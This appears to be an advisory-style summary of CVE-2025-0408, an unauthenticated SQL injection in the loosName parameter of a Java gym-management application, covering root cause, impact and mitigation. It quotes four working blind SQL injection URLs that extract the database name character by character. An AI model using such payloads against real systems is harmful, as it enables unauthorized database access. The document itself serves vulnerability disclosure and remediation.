## CVE Reference Links Content Summary
## Analysis of CVE-2025-0408 Content

Based on the provided content, this relates to a SQL injection vulnerability.

**Root cause of vulnerability:**

The `loosName` parameter in the `query` method of `src/main/java/com/liujian/gymxmjpa/controller/LoosController.java` was not filtered.

**Weaknesses/vulnerabilities present:**

*   SQL Injection

**Impact of exploitation:**

The impact is not explicitly stated, but SQL injection can lead to data breaches, data manipulation, and potentially complete system compromise.

**Attack vectors:**

The vulnerability is exploited by crafting malicious SQL queries through the `loosName` parameter in the URL. Examples provided demonstrate using payloads like:

*   `http://192.168.0.104:8090/loos/query?pageNumber=1&pageSize=10&loosName=%E5%8C%85%25%27%20AND%20length(database())=3%20AND%20%27PiXZ%25%27=%27PiXZ`
*   `http://192.168.0.104:8090/loos/query?pageNumber=1&pageSize=10&loosName=%E5%8C%85%25%27%20AND%20substr(database(),1,1)%20=%20%27g%27%20AND%20%27PiXZ%25%27=%27PiXZ`
*   `http://192.168.0.104:8090/loos/query?pageNumber=1&pageSize=10&loosName=%E5%8C%85%25%27%20AND%20substr(database(),2,1)%20=%20%27y%27%20AND%20%27PiXZ%25%27=%27PiXZ`
*   `http://192.168.0.104:8090/loos/query?pageNumber=1&pageSize=10&loosName=%E5%8C%85%25%27%20AND%20substr(database(),3,1)%20=%20%27m%27%20AND%20%27PiXZ%25%27=%27PiXZ`

**Required attacker capabilities/position:**

An attacker needs to be able to send HTTP requests to the vulnerable endpoint and craft malicious payloads in the `loosName` parameter. No authentication is required based on the provided examples.

**Mitigation or fix:**

The content does not provide specific mitigation steps, but the root cause indicates that proper input validation and sanitization of the `loosName` parameter are required to prevent SQL injection.  Parameterized queries or prepared statements should be used.

**Note:** This content provides more detail than a typical CVE description, including specific examples of exploit payloads and the affected code location.
